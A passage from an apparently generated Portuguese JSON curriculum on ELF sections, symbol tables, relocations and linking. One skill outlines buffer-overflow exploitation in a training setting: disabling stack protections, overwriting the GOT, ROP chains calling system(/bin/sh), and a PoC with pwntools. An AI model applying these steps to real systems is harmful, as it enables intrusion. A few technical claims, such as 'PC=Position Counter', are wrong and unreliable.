                              "realWorldApplication": "Em análise de malware/reverse engineering, use nm/readelf para mapear funções exportadas (T g) em binários suspeitos, identificando entry points como main ou hooks maliciosos; em debugging de builds, verifique símbolos indefinidos (U) para resolver falhas de linkagem em projetos grandes como kernels ou firmwares."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.3.2",
                            "name": "Examinar entradas de relocação",
                            "description": "Analisar 'readelf -r arquivo.o' para entender relocações como R_X86_64_PC32 (relativa a PC) ou R_X86_64_GLOB_DAT (absoluta global), e seu papel na resolução de endereços.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e compilar arquivo objeto simples",
                                  "subSteps": [
                                    "Instale ferramentas: gcc e binutils (readelf) em Linux.",
                                    "Crie um arquivo C simples com símbolos globais e relativos, ex: int global_var = 10; void func() { global_var++; }",
                                    "Compile para objeto: gcc -c -fno-pic arquivo.c -o arquivo.o",
                                    "Verifique se o .o foi gerado com file arquivo.o"
                                  ],
                                  "verification": "Confirme que arquivo.o existe e é um ELF relocatable com ls -l e file.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "Binutils (readelf)",
                                    "Editor de texto",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use -fno-pic para gerar relocações simples; evite otimização com -O0.",
                                  "learningObjective": "Configurar ambiente para gerar e inspecionar código objeto com relocações.",
                                  "commonMistakes": [
                                    "Esquecer de instalar binutils",
                                    "Compilar diretamente para executável em vez de .o",
                                    "Usar PIC que complica relocações"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar readelf -r para listar entradas de relocação",
                                  "subSteps": [
                                    "Execute: readelf -r arquivo.o",
                                    "Identifique seções como .rela.text ou .rel.dyn",
                                    "Anote Offset, Type, Symbol e Addend para cada entrada",
                                    "Compare com símbolos via readelf -s arquivo.o"
                                  ],
                                  "verification": "Output mostra tabela de relocação com pelo menos uma entrada (ex: Offset, Type: R_X86_64_).",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Terminal com readelf",
                                    "Arquivo objeto gerado"
                                  ],
                                  "tips": "Use readelf -h para headers ELF primeiro; pipe para less se output longo.",
                                  "learningObjective": "Extrair e listar entradas de relocação de um objeto ELF.",
                                  "commonMistakes": [
                                    "Comando errado (ex: -R maiúsculo)",
                                    "Analisar executável linked em vez de .o",
                                    "Ignorar seções .rela vs .rel"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar tipos de relocação comuns (R_X86_64_PC32 e R_X86_64_GLOB_DAT)",
                                  "subSteps": [
                                    "Pesquise docs: man elf para tipos x86_64 (PC32=relativa PC+4, GLOB_DAT=absoluta global).",
                                    "Identifique R_X86_64_PC32: relativa ao PC (RIP), usada em calls/jumps.",
                                    "Identifique R_X86_64_GLOB_DAT: endereço absoluto de símbolo global.",
                                    "Mapeie cada tipo ao seu papel: PC32 para branches locais, GLOB_DAT para vars externas."
                                  ],
                                  "verification": "Explique em notas: 'R_X86_64_PC32 em offset X resolve para Y relativo ao PC'.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Documentação ELF (man elf ou online)",
                                    "Output do readelf -r"
                                  ],
                                  "tips": "Use readelf --relocs=foo.o para filtro; memorize: PC=Position Counter.",
                                  "learningObjective": "Diferenciar e explicar semântica de tipos de relocação x86_64.",
                                  "commonMistakes": [
                                    "Confundir relativa/absoluta",
                                    "Ignorar Addend",
                                    "Assumir tipos ARM em x86"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular resolução de endereços com linking e verificação",
                                  "subSteps": [
                                    "Linke dois .o: gcc arquivo1.o arquivo2.o -o exec",
                                    "Compare readelf -r antes/depois (deve sumir em exec linked).",
                                    "Use objdump -d exec para ver código resolvido.",
                                    "Teste com gdb: gdb exec, break func, info reg para ver endereços resolvidos."
                                  ],
                                  "verification": "Relocações ausentes em executável; endereços corretos em objdump/gdb.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "GDB",
                                    "Objdump",
                                    "Múltiplos arquivos .o"
                                  ],
                                  "tips": "Crie dois arquivos com símbolos compartilhados; use -Wl,--verbose para ver linking.",
                                  "learningObjective": "Compreender como linker resolve relocações em runtime/load-time.",
                                  "commonMistakes": [
                                    "Linkar sem símbolos externos",
                                    "Não comparar .o vs exec",
                                    "Esquecer debug symbols"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int x=5; int* foo(){return &x;}' para foo.o. readelf -r mostra R_X86_64_PC32 para call relativa e R_X86_64_GLOB_DAT para &x. Linke com main.o referenciando foo(); verifique resolução em exec via objdump.",
                              "finalVerifications": [
                                "Lista corretamente tipos de relocação em readelf -r output.",
                                "Explica diferença: PC32 (relativa PC) vs GLOB_DAT (absoluta).",
                                "Identifica Offset/Symbol/Addend em tabela.",
                                "Simula resolução manual: endereço final = base + offset + addend (+PC adjust).",
                                "Confirma ausência de relocs em executável linked.",
                                "Usa gdb/objdump para validar endereços resolvidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos (90% correto).",
                                "Explicação clara do papel na resolução de endereços.",
                                "Análise completa de pelo menos 3 entradas de relocação.",
                                "Correta distinção relativa vs absoluta com exemplos.",
                                "Demonstração prática com linking e tools auxiliares.",
                                "Evita erros comuns como confusão de tipos arquiteturas."
                              ],
                              "crossCurricularConnections": [
                                "Assembly: Entender instruções RIP-relativas (x86_64).",
                                "Sistemas Operacionais: Loaders resolvem relocs em runtime.",
                                "Segurança: Exploits em relocs dinâmicos (GOT/PLT em binários).",
                                "Engenharia Reversa: Análise de binários maliciosos via readelf.",
                                "Compiladores: Geração de relocs pelo assembler/linker."
                              ],
                              "realWorldApplication": "Em análise de malware/reverse engineering, examinar relocs em .o/malware ajuda detectar injeções de código ou hooks dinâmicos; debuggers usam para resolver símbolos em crashes; compiladores/OTAs em embedded verificam relocs para otimização de firmware."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.3.3",
                            "name": "Criar código assembly com símbolos relocáveis",
                            "description": "Escrever assembly com referências externas (extern printf) e labels globais, montar e verificar relocações geradas, simulando cenários de linkage.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos de Símbolos Relocáveis, Externos e Globais",
                                  "subSteps": [
                                    "Estudar definição de símbolo externo (extern): usado para referenciar funções ou variáveis definidas em outros módulos.",
                                    "Aprender símbolo global (global ou .globl): torna labels locais visíveis para o linker.",
                                    "Diferenciar símbolos absolutos (endereços fixos) de relocáveis (ajustados no linkage).",
                                    "Revisar tipos de relocação comuns em x86 (ex: R_386_32, R_386_PC32) no formato ELF.",
                                    "Analisar exemplo de tabela de símbolos em arquivos objeto."
                                  ],
                                  "verification": "Explicar em um parágrafo curto as diferenças entre extern, global e relocável, com exemplos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação NASM/GAS",
                                    "Manual ELF (objdump man page)",
                                    "Editor de texto"
                                  ],
                                  "tips": [
                                    "Use extern para importar, global para exportar; relocáveis evitam endereços hard-coded."
                                  ],
                                  "learningObjective": "Dominar terminologia e propósitos de símbolos relocáveis para uso em linkage.",
                                  "commonMistakes": [
                                    "Confundir extern com global",
                                    "Assumir que labels locais são automaticamente globais",
                                    "Ignorar que relocs são necessárias para chamadas externas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escrever Código Assembly com Declarações de Símbolos Relocáveis",
                                  "subSteps": [
                                    "Criar arquivo 'exemplo.asm' com seção .text.",
                                    "Declarar 'extern printf' no topo.",
                                    "Definir label 'main' como 'global main'.",
                                    "Escrever código: preparar string no stack, call printf com endereço relocável.",
                                    "Adicionar seção .data com label global para string."
                                  ],
                                  "verification": "Executar montador (nasm) sem erros de sintaxe ou símbolos indefinidos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "NASM assembler instalado",
                                    "Editor como Vim/VSCode",
                                    "Terminal Linux"
                                  ],
                                  "tips": [
                                    "Use %define para constantes; alinhe stack antes de call.",
                                    "Teste sintaxe com nasm -f elf32 -g exemplo.asm"
                                  ],
                                  "learningObjective": "Criar código assembly funcional que referencia símbolos externos de forma relocável.",
                                  "commonMistakes": [
                                    "Esquecer alinhamento de stack para printf",
                                    "Usar call com endereço absoluto em vez de label",
                                    "Não declarar global em label exportada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Montar o Código e Inspecionar Arquivo Objeto",
                                  "subSteps": [
                                    "Montar com 'nasm -f elf32 exemplo.asm -o exemplo.o'.",
                                    "Verificar tabela de símbolos: 'objdump -t exemplo.o | grep printf'.",
                                    "Inspecionar relocações: 'objdump -r exemplo.o' e identificar entradas para printf.",
                                    "Confirmar que main é global e printf é extern/undefined.",
                                    "Usar 'readelf -s exemplo.o' para detalhes ELF."
                                  ],
                                  "verification": "Tabela de símbolos mostra 'printf' como U (undefined) e 'main' como G (global).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "binutils (objdump, readelf)",
                                    "NASM",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "-g flag para debug symbols; filtre grep para símbolos específicos."
                                  ],
                                  "learningObjective": "Gerar e analisar arquivos objeto para validar símbolos relocáveis.",
                                  "commonMistakes": [
                                    "Usar formato errado (-f win32 em Linux)",
                                    "Não filtrar output de objdump",
                                    "Confundir símbolos locais com globais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Linkage e Verificar Relocações Resolvidas",
                                  "subSteps": [
                                    "Criar stub.asm simples com printf definida (global printf).",
                                    "Montar stub.o e linkar: 'ld -m elf_i386 exemplo.o stub.o -o exec'.",
                                    "Inspecionar executável: 'objdump -d exec' para ver call printf resolvida.",
                                    "Simular cenários: mude endereço base e relink para testar relocação.",
                                    "Executar './exec' e verificar saída (Hello World)."
                                  ],
                                  "verification": "Executável roda sem erros de linkage e relocs são resolvidas corretamente.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "ld linker",
                                    "objdump",
                                    "stub.asm template"
                                  ],
                                  "tips": [
                                    "Use -dynamic-linker /lib/ld-linux.so.2 para full exec; teste com diferentes bases."
                                  ],
                                  "learningObjective": "Simular linkage completo e validar resolução de relocações.",
                                  "commonMistakes": [
                                    "Linkar sem entry point (_start)",
                                    "Stack desalinhado causando segfault",
                                    "Esquecer seções .data no stub"
                                  ]
                                }
                              ],
                              "practicalExample": "Arquivo exemplo.asm:\nsection .data\nglobal msg\nmsg db 'Hello, Relocatable!', 10, 0\nsection .text\nextern printf\nglobal main\nmain:\npush msg\ncall printf\nadd esp, 4\nret",
                              "finalVerifications": [
                                "Código assembly monta sem erros e gera .o válido.",
                                "objdump -r mostra relocação para printf (ex: R_386_PC32).",
                                "Tabela de símbolos lista printf como extern e main como global.",
                                "Linkage com stub produz executável funcional.",
                                "Alteração de base de endereço resolve relocs corretamente.",
                                "Análise do binário final confirma ausência de relocs pendentes."
                              ],
                              "assessmentCriteria": [
                                "Declarações corretas de extern/global sem ambiguidades.",
                                "Uso preciso de referências relocáveis em instruções.",
                                "Análise precisa de objdump/readelf outputs.",
                                "Simulação de linkage bem-sucedida com verificação.",
                                "Identificação de pelo menos 3 tipos de erros comuns evitados.",
                                "Explicação clara de como relocs funcionam no contexto."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entende linkage com bibliotecas como libc.",
                                "Arquitetura de Computadores: Estuda formato ELF e loaders de SO.",
                                "Sistemas Operacionais: Relaciona com carregamento dinâmico de bibliotecas.",
                                "Segurança Computacional: Essencial para análise de binários em RE e exploits.",
                                "Engenharia de Software: Conceitos de modularidade e dependências."
                              ],
                              "realWorldApplication": "Em análise de binários para segurança (reverse engineering de malware), desenvolvimento de loaders personalizados, depuração de linkage em embedded systems e compreensão de como exploits como ROP chains exploram relocações mal resolvidas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.3.4",
                            "name": "Aplicar conceitos em engenharia reversa básica",
                            "description": "Usar símbolos e relocações para mapear fluxo de código em objetos, relacionando com injeção de shellcode ou análise de buffer overflow em contextos ELF.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Símbolos e Tabelas de Relocação em Arquivos ELF",
                                  "subSteps": [
                                    "Estude a estrutura ELF básica: headers, seções (.text, .data, .symtab, .rela.dyn).",
                                    "Identifique tipos de símbolos (funções, variáveis globais, locais) usando documentação do ELF.",
                                    "Aprenda como relocações resolvem endereços simbólicos durante linking dinâmico.",
                                    "Compare símbolos exportados vs. importados em binários estáticos e dinâmicos.",
                                    "Pratique listando seções com 'readelf -S binary.elf'."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre .symtab e .dynsym, e dê um exemplo de relocação R_X86_64_PC32.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Documentação ELF (elf.h), readelf man page, binário ELF de exemplo (ex: hello world compilado com gcc -g)"
                                  ],
                                  "tips": "Use 'readelf -s binary' para visualizar símbolos; foque em binding (local/global) e tipo (FUNC/OBJECT).",
                                  "learningObjective": "Dominar os conceitos fundamentais de símbolos e relocações para inspeção inicial de binários.",
                                  "commonMistakes": [
                                    "Confundir símbolos locais com globais",
                                    "Ignorar seções de relocação como .rela.plt",
                                    "Não diferenciar static vs dynamic linking"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar Símbolos e Relocações com Ferramentas",
                                  "subSteps": [
                                    "Instale e use 'readelf -s -r binary' para dump de símbolos e relocações.",
                                    "Use 'objdump -t -R binary' para análise complementar de símbolos e relocs.",
                                    "Mapeie relocações para símbolos específicos (ex: chamadas a printf).",
                                    "Identifique entradas PLT/GOT para funções dinâmicas.",
                                    "Anote offsets e tipos de relocação em um diagrama manual."
                                  ],
                                  "verification": "Gere um relatório com 5 símbolos e suas relocações correspondentes de um binário dado.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Ferramentas: readelf, objdump (binutils), binários ELF vulneráveis de exploit-exercises ou picoCTF"
                                  ],
                                  "tips": "Filtre output com grep 'FUNC' ou 'R_X86_64'; visualize com 'objdump -d' para contexto de disassembly.",
                                  "learningObjective": "Habilitar inspeção prática de binários ELF para extrair informações de símbolos e fluxos.",
                                  "commonMistakes": [
                                    "Interpretar offsets sem contexto de seção",
                                    "Confundir relocs absolutas com relativas",
                                    "Não verificar architecture (x86_64 vs 32-bit)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Fluxo de Código Usando Símbolos e Relocações",
                                  "subSteps": [
                                    "Disasseble o binário com 'objdump -d binary' e correlacione com símbolos.",
                                    "Trace chamadas de funções via PLT entries e relocações GOT.",
                                    "Construa um grafo de controle de fluxo (CFG) manual destacando símbolos globais.",
                                    "Simule execução passo-a-passo com gdb, observando resolução de relocações.",
                                    "Identifique pontos de entrada/saída baseados em símbolos _start/main."
                                  ],
                                  "verification": "Desenhe e explique um CFG simples de um binário, marcando 3 relocações chave.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "GDB, Graphviz para diagramas, binário com main e funções chamadas (ex: strcpy demo)"
                                  ],
                                  "tips": "Use 'gdb -q binary' com 'disas main'; set breakpoint em PLT para ver resolução.",
                                  "learningObjective": "Mapear logicamente o fluxo de execução de um binário via símbolos e relocs.",
                                  "commonMistakes": [
                                    "Ignorar branches condicionais em CFG",
                                    "Não rastrear relocs em loops",
                                    "Confundir dados com código"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar com Análise de Buffer Overflow e Injeção de Shellcode",
                                  "subSteps": [
                                    "Analise um binário vulnerável a buffer overflow (ex: stack smashing).",
                                    "Use símbolos para localizar buffer e ROP gadgets via relocações.",
                                    "Simule shellcode injection alterando GOT via relocação ou overflow.",
                                    "Teste em ambiente controlado com ASLR off, explorando símbolos para pivot.",
                                    "Documente como engenharia reversa revela vetores de ataque."
                                  ],
                                  "verification": "Crie um PoC exploit para buffer overflow usando insights de símbolos/relocs.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "Binário vulnerável (ex: de damn-vulnerable-binaries), pwntools para scripting, gdb-peda plugin"
                                  ],
                                  "tips": "Compile com '-fno-stack-protector -z execstack'; use 'ROPgadget --binary vuln' pós-mapeamento.",
                                  "learningObjective": "Aplicar mapeamento para identificar e explorar vulnerabilidades reais.",
                                  "commonMistakes": [
                                    "Esquecer mitigações como NX/PIE",
                                    "Não validar offsets com símbolos",
                                    "Exploit sem verificação de relocs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar e Refinar Análise em Cenário Completo",
                                  "subSteps": [
                                    "Escolha um binário real (ex: de CTF) e realize análise full end-to-end.",
                                    "Integre ferramentas em script Python para automação de dumps.",
                                    "Compare análise manual vs automatizada (ex: com radare2).",
                                    "Revise erros e otimize CFG/reloc mapping.",
                                    "Prepare relatório de engenharia reversa."
                                  ],
                                  "verification": "Submeta relatório com CFG, relocs chave e análise de vuln simulada.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Radare2 ou Ghidra para comparação, CTF binaries, Python + lief library"
                                  ],
                                  "tips": "Automatize com 'subprocess' para readelf; valide com execução real.",
                                  "learningObjective": "Consolidar habilidades em análise reversa integrada.",
                                  "commonMistakes": [
                                    "Sobrecarregar com automação prematura",
                                    "Ignorar validação manual",
                                    "Relatório sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o binário 'vuln' (compilado com gcc -m32 -fno-stack-protector -no-pie vuln.c -o vuln). Use readelf para mapear símbolo 'win' na GOT via relocação R_386_GLOB_DAT, trace fluxo de main->strcpy, identifique overflow em buffer local, e injete shellcode para ROP chain chamando 'system(/bin/sh)' pivotando via símbolos.",
                              "finalVerifications": [
                                "Corretamente liste e interprete 10+ símbolos e 5 relocações de um binário ELF dado.",
                                "Construa CFG preciso cobrindo 80% do fluxo de código principal.",
                                "Simule e explique exploração de buffer overflow usando insights de símbolos.",
                                "Identifique PLT/GOT entries para 3 funções dinâmicas.",
                                "Gere PoC exploit funcional em ambiente controlado.",
                                "Compare análise com disassembly tool alternativo sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e interpretação de símbolos/relocações (30%)",
                                "Qualidade e completude do mapeamento de fluxo de código (25%)",
                                "Correlação correta com cenários de exploit (20%)",
                                "Uso eficaz de ferramentas e verificações (15%)",
                                "Relatório claro com diagramas e evidências (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender disassembly e gadgets ROP.",
                                "Sistemas Operacionais: Linking dinâmico e loaders ELF.",
                                "Segurança da Informação: Mitigações como ASLR, NX, RELRO.",
                                "Engenharia de Software: Análise estática de binários.",
                                "Análise de Malware: Reverse de samples reais."
                              ],
                              "realWorldApplication": "Em pentesting e análise de malware, engenheiros reversos usam símbolos/relocações para mapear binários proprietários, descobrir ROP chains em overflows, injetar shellcode em CTFs/concursos reais, e auditar firmware IoT vulnerável, acelerando detecção de zero-days."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.4",
                    "name": "Linkagem para Formação de Executáveis",
                    "description": "Combinação de arquivos objeto em executáveis, incluindo resolução de símbolos e bibliotecas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.4.1",
                        "name": "Arquivos Objeto e Tabelas de Símbolos",
                        "description": "Entender a estrutura dos arquivos objeto gerados após a compilação e montagem, incluindo seções como .text, .data, .bss e a tabela de símbolos que lista símbolos definidos e indefinidos.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.1.1",
                            "name": "Identificar seções em arquivos objeto",
                            "description": "Usar ferramentas como objdump ou readelf para examinar as seções de um arquivo .o (ex: .text para código, .data para dados inicializados) e compreender seu papel na linkagem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e criar arquivo objeto simples",
                                  "subSteps": [
                                    "Instale as ferramentas binutils (readelf e objdump) se necessário: sudo apt install binutils no Linux.",
                                    "Escreva um programa C simples em um arquivo hello.c: #include <stdio.h> int main() { printf(\"Hello\\n\"); return 0; }",
                                    "Compile para objeto sem linkar: gcc -c hello.c -o hello.o",
                                    "Verifique que o arquivo .o foi criado com ls -la hello.o"
                                  ],
                                  "verification": "Confirme a existência do arquivo hello.o e seu tamanho >0 com ls -la",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (vim/nano)",
                                    "GCC compiler",
                                    "Binutils (readelf/objdump)",
                                    "Terminal Linux/macOS"
                                  ],
                                  "tips": "Use -Wall no gcc para detectar warnings cedo",
                                  "learningObjective": "Entender o processo de compilação para objeto e preparar amostra para análise",
                                  "commonMistakes": "Esquecer -c flag, resultando em executável em vez de .o; não incluir headers corretamente"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar seções com readelf",
                                  "subSteps": [
                                    "Execute readelf -S hello.o para ver todas as seções",
                                    "Identifique seções principais: .text, .data, .bss, .rodata, .symtab",
                                    "Anote o endereço, tamanho e tipo de cada seção (PROGBITS, NOBITS, etc.)",
                                    "Compare com documentação: man readelf para flags"
                                  ],
                                  "verification": "Saída mostra seções como .text (código) e .data (dados inicializados)",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Arquivo hello.o",
                                    "readelf tool"
                                  ],
                                  "tips": "Use readelf -h para headers ELF gerais primeiro",
                                  "learningObjective": "Dominar readelf para inspeção de seções em arquivos objeto ELF",
                                  "commonMistakes": "Confundir readelf com objdump; ignorar seções como .rela.text (relocações)"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar conteúdo das seções com objdump",
                                  "subSteps": [
                                    "Execute objdump -h hello.o para headers de seções (semelhante a readelf)",
                                    "Dump .text: objdump -d --section=.text hello.o",
                                    "Dump .data: objdump -s --section=.data hello.o",
                                    "Dump símbolos: objdump -t hello.o",
                                    "Observe código assembly em .text e dados hex em .data"
                                  ],
                                  "verification": "Visualize instruções assembly em .text e valores hex/bin em .data",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo hello.o",
                                    "objdump tool"
                                  ],
                                  "tips": "--disassemble-all ou -D para tudo; pipe para less para navegação",
                                  "learningObjective": "Interpretar dumps de seções para entender conteúdo e formato",
                                  "commonMistakes": "Não especificar --section, dumpando tudo desnecessariamente; misinterpretar endianness"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compreender papéis das seções na linkagem",
                                  "subSteps": [
                                    "Pesquise papéis: .text (código executável), .data (dados init), .bss (dados não-init), .symtab (símbolos)",
                                    "Crie exemplo com variável global: int global=42; em C e recompile/análise",
                                    "Simule linkagem: gcc hello.o -o hello e compare seções com readelf -S hello",
                                    "Discuta como linker resolve .text para código final e relocações"
                                  ],
                                  "verification": "Explique verbalmente ou anote como cada seção contribui para executável",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação ELF (elf.h ou online)",
                                    "Múltiplos arquivos .o"
                                  ],
                                  "tips": "Use nm hello.o para símbolos simples",
                                  "learningObjective": "Conectar seções de .o ao processo de linkagem estática/dinâmica",
                                  "commonMistakes": "Confundir .data com .bss; ignorar seções de debug como .debug_info"
                                }
                              ],
                              "practicalExample": "Compile 'int x=10; void func(){}' para test.o. Use readelf -S: veja .text com func, .data com x=0x0a. Linke a main.o: linker mapeia .text para código executável.",
                              "finalVerifications": [
                                "Lista corretamente 5+ seções comuns (.text, .data, .bss, .symtab, .strtab)",
                                "Identifica conteúdo de .text como assembly/machine code",
                                "Diferencia .data (inicializado) de .bss (zero-init)",
                                "Explica impacto de seções na linkagem final",
                                "Analisa um .o customizado sem erros"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos de seções (90%+ correto)",
                                "Descrição clara de pelo menos 4 seções principais",
                                "Interpretação correta de dumps objdump/readelf",
                                "Explicação coerente do papel na linkagem",
                                "Tempo de análise <5min para novo .o"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender geração de código",
                                "Análise de Binários/Malware: Identificar payloads em seções",
                                "Arquitetura de Computadores: Layout de memória ELF",
                                "Debugging/GDB: Mapear símbolos de .symtab"
                              ],
                              "realWorldApplication": "Em segurança, analise seções de malware .o para detectar código ofuscado em .text ou strings em .rodata; em devops, verifique otimizações de linkagem em builds grandes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.2",
                            "name": "Analisar tabela de símbolos",
                            "description": "Interpretar a tabela de símbolos em um arquivo objeto, distinguindo símbolos locais/globais, definidos/indefinidos e seus tipos (função, variável), preparando para resolução na linkagem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e obter um arquivo objeto de exemplo",
                                  "subSteps": [
                                    "Instale ferramentas essenciais como objdump e readelf (parte do binutils).",
                                    "Compile um programa C simples em assembly sem linkar: gcc -c exemplo.c -o exemplo.o",
                                    "Verifique o arquivo gerado com file exemplo.o para confirmar formato (ELF, COFF etc.)",
                                    "Liste as seções do arquivo com objdump -h exemplo.o para identificar .symtab",
                                    "Crie um backup do arquivo para evitar modificações acidentais"
                                  ],
                                  "verification": "Confirme que objdump -h mostra seção .symtab e que o arquivo .o existe.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "GCC, binutils (objdump, readelf), editor de texto, programa C simples com funções e variáveis globais/locais",
                                  "tips": "Use um programa com mistura de símbolos locais/globais e chamadas externas como printf para enriquecer a análise.",
                                  "learningObjective": "Configurar ambiente para análise de arquivos objeto e gerar exemplos realistas.",
                                  "commonMistakes": "Compilar com linkagem completa (use -c); esquecer de instalar binutils."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e extrair a tabela de símbolos",
                                  "subSteps": [
                                    "Execute objdump -t exemplo.o para dump da tabela de símbolos.",
                                    "Ou use readelf -s exemplo.o para detalhes ELF específicos.",
                                    "Identifique colunas: Num, Value, Size, Type, Bind, Vis, Ndx, Name.",
                                    "Conte o número total de símbolos e note padrões iniciais.",
                                    "Salve a saída em um arquivo de texto para análise offline."
                                  ],
                                  "verification": "A saída mostra tabela com pelo menos 10-20 símbolos, incluindo nomes reconhecíveis.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Arquivo .o gerado, objdump, readelf",
                                  "tips": "Prefira objdump -T para símbolos dinâmicos se aplicável, mas foque em -t para estáticos.",
                                  "learningObjective": "Extrair e visualizar a tabela de símbolos de um arquivo objeto.",
                                  "commonMistakes": "Confundir .symtab com .dynsym; ignorar headers do dump."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar os atributos básicos de cada símbolo",
                                  "subSteps": [
                                    "Analise a coluna 'Bind': LOCAL vs GLOBAL.",
                                    "Examine 'Type': FUNC para funções, OBJECT para variáveis, NOTYPE para especiais.",
                                    "Verifique 'Ndx' (seção): UND para indefinidos, números para definidos.",
                                    "Note 'Value' e 'Size': zero para indefinidos.",
                                    "Registre 5 símbolos com anotações manuais em uma tabela."
                                  ],
                                  "verification": "Crie uma tabela manual listando 5 símbolos com Bind, Type e Ndx corretos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Saída do objdump salva, planilha ou editor para tabela manual",
                                  "tips": "Comece pelos símbolos no topo; eles são frequentemente resolvidos pelo linker.",
                                  "learningObjective": "Decodificar campos chave da entrada de símbolo (binding, type, section).",
                                  "commonMistakes": "Confundir Bind (visibilidade) com Type (natureza); ignorar símbolos UND."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Classificar símbolos por escopo e status",
                                  "subSteps": [
                                    "Separe definidos (Ndx != UND) de indefinidos (UND).",
                                    "Classifique locais (Bind=LOCAL) vs globais (Bind=GLOBAL).",
                                    "Agrupe por tipo: funções (FUNC), variáveis (OBJECT).",
                                    "Identifique símbolos principais do programa (ex: main como FUNC GLOBAL definida).",
                                    "Marque dependências externas (ex: printf como FUNC GLOBAL indefinida)."
                                  ],
                                  "verification": "Gere relatório com contagens: X locais definidos, Y globais indefinidos etc.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Tabela manual do step 3, contador simples (planilha)",
                                  "tips": "Use grep ou awk na saída do objdump para filtrar: objdump -t | grep ' g.*FUNC' para globais funções.",
                                  "learningObjective": "Distinguir e categorizar símbolos para entender dependências.",
                                  "commonMistakes": "Classificar locais como globais; esquecer símbolos NOTYPE como _start."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Preparar análise para linkagem",
                                  "subSteps": [
                                    "Liste símbolos indefinidos globais: serão resolvidos pelo linker.",
                                    "Verifique conflitos potenciais (símbolos globais duplicados em múltiplos .o).",
                                    "Simule linkagem: ld exemplo.o -lc -o exemplo para ver erros de resolução.",
                                    "Anote como locais não afetam linkagem externa.",
                                    "Documente insights para relatório final."
                                  ],
                                  "verification": "Execute linkagem parcial e explique erros baseados na análise de símbolos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "ld linker, libc para simulação",
                                  "tips": "Use -r para relocatable se múltiplos .o; foque em resolução de indefinidos.",
                                  "learningObjective": "Conectar análise de símbolos ao processo de linkagem.",
                                  "commonMistakes": "Linkar sem -lc causando erros esperados; ignorar visibilidade."
                                }
